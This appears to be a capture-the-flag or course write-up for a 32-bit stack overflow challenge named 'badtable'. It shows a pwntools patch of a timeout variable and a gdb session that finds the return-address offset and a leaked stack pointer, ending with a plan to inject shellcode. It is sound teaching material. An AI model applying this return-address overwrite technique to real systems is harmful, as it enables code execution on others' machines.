# Badtable Exploitation

First of all take the binary and patch the timeout:
```
elf = pwn.ELF(sys.argv[1])

# Find the address of the 'timeout' global variable
timeout_addr = elf.symbols['timeout'] 

# Patch the 'timeout' variable with a new value
elf.write(timeout_addr, pwn.p32(0x0))  

elf.save(sys.argv[2])
```
Now run the patched version and connect to the service.
In the container, identify the service process (`ps aux`) and connect to it (`gdp -p <pid>`).

Use `bt` and `frame`` to get to main's frame and determine the address of `array`.
```
gef➤  bt
#0  0xf7fbc549 in __kernel_vsyscall ()
#1  0xf7eb3bab in read () from /lib/i386-linux-gnu/libc.so.6
#2  0xf7e3bc73 in _IO_file_underflow () from /lib/i386-linux-gnu/libc.so.6
#3  0xf7e3d020 in _IO_default_uflow () from /lib/i386-linux-gnu/libc.so.6
#4  0xf7e2efd1 in _IO_getline_info () from /lib/i386-linux-gnu/libc.so.6
#5  0xf7e2f112 in _IO_getline () from /lib/i386-linux-gnu/libc.so.6
#6  0xf7e2de11 in fgets () from /lib/i386-linux-gnu/libc.so.6
#7  0x56595325 in get_char () at badtable.c:27
#8  0x565953c6 in main (argc=0x1, argv=0xffb6aef4) at badtable.c:54
gef➤  frame 8
#8  0x565953c6 in main (argc=0x1, argv=0xffb6aef4) at badtable.c:54
54	    command = get_char();
gef➤  print &array
$1 = (int (*)[1024]) 0xffb69e4c
```
We know that the return address is going to be right after the saved ebp (which is 0):
```
gef➤  x/2xw $ebp
0xffb6ae58:	0x00000000	0xf7ddced5
```
Now let's see what is the offset of the saved registers with respect to the array:
```
gef➤  p/d (0xffb6ae58 - 0xffb69e4c) / 4
$2 = 1027
```
These two values are `array[1027]` and `array[1028]`. 
Now we have to find on the stack a value that represent a pointer on the stack.
Let's look at some values after the saved ebp and saved eip:
```
gef➤  x/10xw 0xfffe486c
0xfffe486c:	0x00000000	0xf7eff000	0x00000400	0x00000000
0xfffe487c:	0xf7d2eed5	0x00000001	0xfffe4914	0xfffe491c
0xfffe488c:	0xfffe48a4	0xf7eff000
```
The value at offset `array[1030]` contains a stack pointer (it is close to the value of `array`).
Now we calculate the difference:
```
gef➤  p/d (0xfffe4914 - 0xfffe386c)
$18 = 4264
```
This tells us that if we read the value at location `array[1030]` and we subtract 4264, we obtain the address of the beginning of the array.
We now have to create the shellcode, put it in the array and then overwrite `array[1028]` with the address of `array`.
